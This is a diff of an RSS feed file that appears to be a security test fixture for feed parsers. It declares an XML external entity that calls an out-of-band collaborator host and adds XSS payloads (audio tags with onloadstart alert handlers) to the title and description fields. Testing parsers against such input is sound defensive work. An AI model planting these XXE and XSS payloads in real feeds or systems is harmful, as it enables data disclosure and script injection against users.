@@ -3,14 +3,14 @@
 <!ENTITY xxe SYSTEM "http://84aiyng2kdte9ki1wsf5v72syj4hs6.cigitalcollaborator.com" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-    <title>xss</title>
+    <title><audio src onloadstart=alert(1)></title>
     <link>http://rb6156nlrw0xg3pk3bmo2q9b52b1zq.cigitalcollaborator.com/</link>
-    <description>xss</description>
+    <description><audio src onloadstart=alert(2)></description>
     <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
     <item>
         <title>&xxe;</title>
         <link>http://uqo4k92o6zf0v64nie1rhtoek5q5eu.cigitalcollaborator.com</link>
-        <description>xss</description>
+        <description><audio src onloadstart=alert(3)></description>
         <author>author@example.com</author>
         <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
     </item>
